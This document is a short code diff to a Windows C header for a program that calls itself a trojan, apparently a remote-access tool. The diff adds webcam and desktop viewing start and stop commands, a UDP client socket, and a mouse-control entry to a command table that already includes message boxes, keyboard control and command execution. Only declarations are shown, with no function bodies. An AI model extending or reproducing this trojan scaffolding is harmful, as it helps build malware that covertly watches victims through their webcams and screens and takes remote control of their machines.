@@ -5,7 +5,7 @@
 
 #include <Windows.h>
 
-#define NUMBER_OF_COMMANDS 2
+#define NUMBER_OF_COMMANDS 3
 
 #define TASK_SUCCESSP       TEXT("Success")
 #define TASK_SUCCESSW       L"Success"
@@ -27,8 +27,10 @@
 typedef enum
 {
 	MESSAGEBOX,
-	VIEWDESKTOP,
-	VIEWWEBCAM,
+	VIEWDESKTOP_START,
+	VIEWDESKTOP_STOP,
+	VIEWWEBCAM_START,
+	VIEWWEBCAM_STOP,
 	KEYBOARDCTRL,
 	MOUSECTRL,
 	EXECUTECMD,
@@ -49,7 +51,7 @@ typedef struct
 	INT    code;
 } PAIR;
 
-typedef VOID(*trojan_task)(CONST PTCHAR args, PTCHAR result);
+typedef VOID(*trojan_task)(CONST PVOID args, PTCHAR result);
 
 typedef struct
 {
@@ -57,13 +59,17 @@ typedef struct
 	trojan_task task;
 } MAP;
 
-VOID _on_task_MESSAGEBOX(CONST PTCHAR args, PTCHAR result);
-VOID _on_task_MOUSECTRL(CONST PTCHAR args, PTCHAR result);
-VOID _on_task_EXECUTECMD(CONST PTCHAR args, PTCHAR result);
+SOCKET InitUDPClient();
+
+VOID _on_task_MESSAGEBOX(CONST PVOID args, PTCHAR result);
+VOID _on_task_VIEWDESKTOP(CONST PVOID args, PTCHAR result);
+VOID _on_task_MOUSECTRL(CONST PVOID args, PTCHAR result);
+VOID _on_task_EXECUTECMD(CONST PVOID args, PTCHAR result);
 
 static CONST MAP MAP_COMMANDS[NUMBER_OF_COMMANDS] =
 {
 	{ { TEXT("message"), MESSAGEBOX }, _on_task_MESSAGEBOX },
+	{ { TEXT("mouse"  ), MOUSECTRL  }, _on_task_MOUSECTRL  },
 	{ { TEXT("execute"), EXECUTECMD }, _on_task_EXECUTECMD }
 };
 
